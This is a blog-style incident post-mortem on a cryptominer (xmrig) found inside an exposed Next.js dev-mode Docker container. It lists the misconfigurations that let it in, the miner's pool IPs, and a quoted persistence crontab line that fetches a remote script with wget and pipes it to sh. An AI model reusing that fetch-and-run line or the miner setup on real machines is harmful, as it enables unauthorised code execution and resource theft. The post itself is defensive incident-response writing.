---
title: "How a Cryptominer Spent Two Days on My Server — and How I Found It"
date: 2026-05-22 19:12:11 -0300
categories: [DevOps, Security]
tags: [docker, security, incident-response, self-hosting, linux, xmrig, monero]
description: "An AI agent investigating a slow server found a Monero miner consuming 50% CPU inside a Docker container. Here's the full incident — how it got in, what it was doing, and everything wrong that allowed it."
pin: false
math: false
mermaid: false
---

## A Random Question

My server felt sluggish. I asked my local AI agent Diabrete to investigate — routine diagnostics. Load averages of 29, 30, 32 on a 24-thread Xeon E5? That's not normal.

Two minutes later: "You have a Monero miner running inside a Docker container."

Three xmrig processes. 1,887% CPU combined. Running for roughly two days. Inside a Next.js dashboard container I'd forgotten even existed.

This is the full post-mortem — how a broken hobby project became a cryptomining beachhead, how it was discovered, and every single mistake that made it possible.

---

## The Discovery Chain

The entire incident was discovered by accident during a routine performance check:

```
# User: "why is this machine slow?"

$ uptime
  load average: 29.47, 30.68, 32.33

$ ps aux --sort=-%cpu | head -5
PID  %CPU  COMMAND
1118689 579%  xmrig -o pool.supportxmr.com:443
2599783 563%  /BIna54 -c /CDkQ -B
3616081  67%  /HKObJgoE

$ pstree -aps 1118689
systemd → containerd-shim → npm run dev → xmrig-6.21.0/xmrig
```

Three suspicious binaries, all children of `npm run dev` inside a Docker container named `server-dashboard`. Load averages made sense: three miners consuming roughly half of all available CPU across 24 threads.

The miner had been running approximately 48 hours before detection.

---

## The Container

The infected container was a Next.js 15 server dashboard I had built ages ago — a monitoring panel that displays system metrics and manages Docker containers through the Docker API. A weekend project that I deployed and never touched again.

The container had **everything wrong with it**:

**Running in development mode.**
```json
"scripts": {
  "dev": "PORT=8080 next dev",   // ← this was running
  "start": "next start"           // ← this should have been running
}
```
`next dev` exposes unauthenticated Hot Module Replacement (HMR) WebSocket endpoints, debug routes, and source maps. It's designed for local development only.

**Exposed on port 80 to the internet.**
```yaml
ports:
  - "80:8080"   # ← bound to 0.0.0.0
```
No firewall. No auth proxy. No authentication on any endpoint.

**Docker socket mounted inside.**
```yaml
volumes:
  - /var/run/docker.sock:/var/run/docker.sock:ro
```
Read-only, but still the single biggest risk — if the attacker had installed the Docker CLI, they'd have had root-level access to the host.

**Host proc and sys mounted.**
```yaml
volumes:
  - /proc:/host/proc:ro
  - /sys:/host/sys:ro
```

**The application itself was broken.** The dashboard had never actually worked — a bug in the code (`ReferenceError: returnNaN is not defined`) meant every page load returned a 500 error. The logs showed thousands of these errors being actively probed:

```
 POST / 500 in 815ms
 POST / 500 in 754ms
 POST / 500 in 807ms
 (... thousands more ...)
 GET / 200 in 750ms
```

An attacker (or more likely, an automated scanner) found the exposed service, identified it as Next.js in dev mode, and exploited it for remote code execution.

---

## The Malware

Three binaries and a config file were found inside the container at `/`:

| File | Size | Created |
|------|------|---------|
| `xmrig-6.21.0/xmrig` | 8.9 MB | Nov 2023 (stock binary) |
| `/BIna54` | 2.6 MB | May 22 14:01 UTC |
| `/HKObJgoE` | 1.3 MB | May 21 13:40 UTC |
| `/CDkQ` | 12 KB | May 22 14:01 UTC |

The xmrig binary was a standard v6.21.0 release, deployed to `/app/xmrig-6.21.0/xmrig`. The other two binaries (`BIna54`, `HKObJgoE`) had randomly generated names common in automated cryptojacking campaigns — they're obfuscated ELF files, likely secondary miners or helper payloads.

### Mining Configuration

The config file `/CDkQ` revealed 16 fallback pool endpoints:

| IP | Ports |
|----|-------|
| `156.246.94.183` | 80, 443, 53, 123 |
| `45.196.97.119` | 80, 443, 53, 123 |
| `91.208.184.203` | 80, 443, 53, 123 |
| `1.1.3.3` | 80, 443, 53, 123 |

Wallet identifier: `imeatingpoop` — a username for a private proxy pool, not a standard Monero address. The attacker used common service ports (80, 443, 53, 123) to bypass firewalls that block non-standard ports.

RandomX mining with 1GB hugepages. CPU-only — CUDA and OpenCL disabled. Background mode and yield enabled (the "polite" setting). No TLS on any pool connection.

### Persistence

A root crontab ran every 5 minutes:

```
*/5 * * * * wget -q https://pastebin.com/raw/1E9cGF4W -O- |sh > /dev/null 2>&1
```

Notably, Pastebin had **already taken this paste down** on April 30, 2026 — about three weeks before the infection was active. The paste was flagged as potentially harmful, and accessing it returns a 404. The persistence mechanism was dead on arrival; only the initially spawned processes kept running.

---

## Process Tree

```
systemd(1)
 └─ containerd-shim(1855764)
     └─ npm run dev(1856219) [Next.js dev server]
         ├─ xmrig-6.21.0/xmrig — 16 threads, 579% CPU
         ├─ BIna54 -c /CDkQ -B — 16 threads, 563% CPU
         ├─ [BIna54] <defunct> — zombie process
         └─ /HKObJgoE — 67% CPU
```

All miners were children of `npm run dev` — the Node.js process was used to spawn the malware directly.

---

## Impact

| Metric | During Infection | Normal |
|--------|-----------------|--------|
| CPU Load (1m/5m/15m) | 29.47 / 30.68 / 32.33 | ~1-3 |
| CPU Used by Malware | ~1,887% / 2,400% | — |
| Swap Usage | 19 GB of 63 GB | ~0 GB |
| Context Switches/s | 20,000+ | ~500-1,000 |
| I/O Wait | 7-8% | ~0-1% |

**Data impact: zero.** The miner was CPU-bound — no data exfiltration, no file encryption, no application code modification. Containers are effective at isolation: the infection stayed inside this one container. The Docker socket was read-only and was never used for host escape. All 30+ other running containers were scanned — none infected.

---

## Lessons Learned

Six things I got wrong, in order of severity:

### 1. Never run `next dev` in production
This is the headline. Next.js development mode is not a production server. It exposes HMR WebSocket endpoints that can accept arbitrary compilation requests. There are documented CVEs for this exact attack vector. `next build && next start` is not optional.

### 2. Treat abandoned containers as liabilities
If a containerized application is broken, shut it down. A non-functional dashboard is worse than no dashboard — it's a free attack surface nobody monitors. The code that never worked (`returnNaN is not defined`) meant the application logs were unread noise. Thousands of failed exploit attempts went unnoticed because the error was already expected.

### 3. Mount the Docker socket only when absolutely necessary
Even read-only access to `/var/run/docker.sock` is a privilege escalation vector waiting to happen. If the attacker had installed the Docker CLI inside the Alpine container, they would have had root access to Docker on the host — full compromise. The dashboard didn't need host Docker access the way it was implemented; it was a design shortcut.

### 4. Container resource limits prevent resource abuse
A simple CPU quota on the container would have limited the miner's impact. Without limits, the container consumed as much CPU as was available:
```yaml
deploy:
  resources:
    limits:
      cpus: '2'
```

### 5. Monitor swap as an intrusion signal
RandomX mining with 1GB hugepages triggered a 19 GB swap allocation. A jump from 0 to 19 GB swap is a strong signal that something abnormal is happening — far more actionable than CPU load alone.

### 6. Container health monitoring matters
No alert fired because no one was watching. A simple check watching for unexpected process trees — "Node.js just spawned 16 threads doing compute work" — would have caught this within minutes.

---

## Remediation

The container was stopped, removed, and won't be rebuilt. The project repo stays as a reminder.

Post-mortem published as an internal document with artifact hashes and attacker IPs for reference.

---

## Why This Matters for Homelab Self-Hosting

The home server / homelab community runs a lot of Docker containers. Some are critical infrastructure (DNS, VPN, media servers), some are experimental, and many fall into the "deployed and forgotten" category. This was one of the forgotten ones.

What made this incident interesting wasn't the sophistication of the attack — it was mundane. An automated scanner found an open port, identified a known-vulnerable service, and executed a standard cryptojacking payload. What made it notable is that **nobody noticed for two days**, and the only reason it was found at all was an AI agent running a routine diagnostic.

The next one might not be a miner. It might encrypt your files, exfiltrate your data, or pivot to your Tailnet.

Review your containers. Kill the ones you don't need. Build the ones you keep in production mode, with resource limits, no Docker socket mounts, and behind a firewall.

---

*Written with [Mimo v2.5 Pro](https://crof.ai/models/mimo)*
